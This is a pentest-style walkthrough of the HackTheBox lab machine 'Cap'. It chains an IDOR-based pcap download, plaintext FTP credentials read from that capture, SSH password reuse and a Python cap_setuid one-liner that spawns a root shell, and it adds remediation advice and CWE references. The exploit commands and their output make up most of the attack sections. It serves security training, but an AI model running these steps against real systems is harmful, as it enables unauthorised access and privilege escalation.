![](attachments/Pasted%20image%2020251023125801.png)
# HackTheBox — Cap Notes by R4ndH3x

# 1.  Port Scanning

`nmap -sC -sV -oA nmap/lame -vv -Pn cap.htb`

| Port | Protocol | State | Service | Reason  | Product  | Version                 | Extra Info                 |
| ---- | -------- | ----- | ------- | ------- | -------- | ----------------------- | -------------------------- |
| 21   | tcp      | open  | ftp     | syn-ack | vsftpd   | 3.0.3                   |                            |
| 22   | tcp      | open  | ssh     | syn-ack | OpenSSH  | 8.2p1 Ubuntu 4ubuntu0.2 | Ubuntu Linux; protocol 2.0 |
| 80   | tcp      | open  | http    | syn-ack | gunicorn |                         |                            |

## 1.1 gunicorn

![](attachments/Pasted%20image%2020251024053312.png)

### 1.1.1 (High) Insecure Direct Object Reference 

#### 1.1.1.1 Exploitation

An insecure direct object reference (IDOR) has been found when accessing the link `http://cap.htb/data/<integer>`

![](attachments/Pasted%20image%2020251024053405.png)
> This demonstrates a page is returned when accessing http://cap.htb/data/0 and the tester is able to click the Download button and was able to access other user files.

The tester was able to download a file called `0.pcap` from http://cap.htb/data/0 and opened it using wireshark.

```less
┌─[r4ndhex@parrot]─[/hackthebox/machine/cap/files]
└──╼ $ wireshark 0.pcap
```

![](attachments/Pasted%20image%2020251024053711.png)
> This shows we are able to open 0.pcap using wireshark downloaded from http://cap.htb/data/0

After examing the file in wireshark, the tester found credentials used when a user named `nathan` accessed the FTP service.

![](attachments/Pasted%20image%2020251024054347.png)
> This showcases a user named nathan interacting with FTP service and the password is displayed in raw text. nathan:Buck3tH4TF0RM3!

The tester used the same credentials leaked in the file `0.pcap` to gain access in FTP service.

```less
┌─[r4ndhex@parrot]─[hackthebox/machine/cap/files]
└──╼ $ ftp cap.htb
Connected to cap.htb.
220 (vsFTPd 3.0.3)
Name (cap.htb:r4ndhex): nathan
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||15035|)
150 Here comes the directory listing.
-r--------    1 1001     1001           33 Oct 23 12:59 user.txt
226 Directory send OK.
ftp> 

ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||24115|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |******************************************************************************************|    33      259.89 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.04 KiB/s)
ftp> exit
221 Goodbye.

┌─[r4ndhex@parrot]─[hackthebox/machine/cap/files]
└──╼ $ cat user.txt 
29162a245182e8e3a3293f205f32ef5e
```
> This demonstrates the file user.txt was downloaded from using the credentials exposed in 0.pcap within the FTP service.

#### 1.1.1.4 Remediation

- Validate authorization on every object access.  
- Use indirect references (UUIDs, per-user tokens) not sequential IDs.  
- Enforce server-side access checks, never rely on client input.  
- Add logging/alerting for abnormal object access patterns.  
- Add automated tests for access-control checks (unit + integration).

#### 1.1.1.5 Reference

| Name / CVE / CWE | Score | Description                                      | Security Impact                                           | Affected Domain         | External References                                                                                |
| ---------------- | ----- | ------------------------------------------------ | --------------------------------------------------------- | ----------------------- | -------------------------------------------------------------------------------------------------- |
| **CWE-639**      | N/A   | Authorization Bypass Through User-Controlled Key | Allows attackers to access or modify other users’ data \| | Web Applications / APIs | [https://cwe.mitre.org/data/definitions/639.html](https://cwe.mitre.org/data/definitions/639.html) |

## 1.2 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 

### 1.2.1 (High) Password Reuse 

#### 1.2.1.1 Evidence

```less
┌─[r4ndhex@parrot]─[/hackthebox/machine/cap/files]
└──╼ $ ssh nathan@cap.htb
nathan@cap.htb's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Oct 24 05:56:10 UTC 2025

  System load:           0.08
  Usage of /:            37.1% of 8.73GB
  Memory usage:          22%
  Swap usage:            0%
  Processes:             225
  Users logged in:       0
  IPv4 address for eth0: 10.129.46.57
  IPv6 address for eth0: dead:beef::250:56ff:feb9:cece


63 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Oct 24 05:53:25 2025 from 10.10.14.18
nathan@cap:~$ id
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
```

#### 1.1.1.4 Remediation

- Enforce unique, non-reused passwords per account.  
- Block weak or breached passwords using public breach lists (e.g., HaveIBeenPwned).  
- Enable multi-factor authentication (MFA) for all remote or interactive access.  
- Store passwords using salted, adaptive hashing (bcrypt or Argon2).  
- Audit and rotate any exposed or logged credentials immediately.

#### 1.1.1.5 Reference


| Name / CVE / CWE | Score | Description                | Security Impact                                                  | Affected Domain        | External References                                                                                  |
| ---------------- | ----- | -------------------------- | ---------------------------------------------------------------- | ---------------------- | ---------------------------------------------------------------------------------------------------- |
| **CWE-1391**     | N/A   | Use of Weak Credentials    | Enables unauthorized access through easily guessable credentials | Authentication Systems | [https://cwe.mitre.org/data/definitions/1391.html](https://cwe.mitre.org/data/definitions/1391.html) |
| **CWE-521**      | N/A   | Weak Password Requirements | Increases risk of brute-force and credential stuffing attacks    | Authentication Systems | [https://cwe.mitre.org/data/definitions/521.html](https://cwe.mitre.org/data/definitions/521.html)   |

### 1.2.2 (High) Python Binary Privilege Escalation 

#### 1.2.2.1 Exploitation

The tester examined the capabilities of each file recursively and found `/usr/bin/python3.8`  has a `CAP_SETUID` capability.

```less
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
 > This showcases the results of `getcap -r / 2>/dev/null` and shows `/usr/bin/python3.8`  has a `CAP_SETUID` capability.
 
 Tester then proceeded to exploit the vulnerability by manipulating its own process UID.

```less
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# script /dev/null -c bash
Script started, file is /dev/null

root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
```
> This demonstrates the privilege escalation by running the vulnerability found in `/usr/bin/python3.8`

#### 1.1.1.4 Remediation

- Remove unnecessary file capabilities from interpreters:     ```bash   sudo setcap -r /usr/bin/python3.8`
- Assign minimal capabilities only to purpose-built binaries rather than interpreters.
- Ensure `/usr/bin/python3.8` and related libraries are root-owned and non-writable by unprivileged users.
- Apply AppArmor, SELinux, or seccomp profiles to limit interpreter privileges.
- Perform routine capability audits to detect unauthorized privilege assignments:

#### 1.1.1.5 Reference

| Name / CVE / CWE | Score | Description                                                                                                                                                                                                         | Security Impact                                                                                    | Affected Domain           | External References                             |
| ---------------- | ----- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------- | ------------------------- | ----------------------------------------------- |
| CWE-250          | N/A   | Improper Privilege ManagementThe product performs an operation at a privilege level that is higher than the minimum level required, which creates new weaknesses or amplifies the consequences of other weaknesses. | An attacker will be able to gain access to any resources that are allowed by the extra privileges. | OS / Application Binaries | https://cwe.mitre.org/data/definitions/250.html |
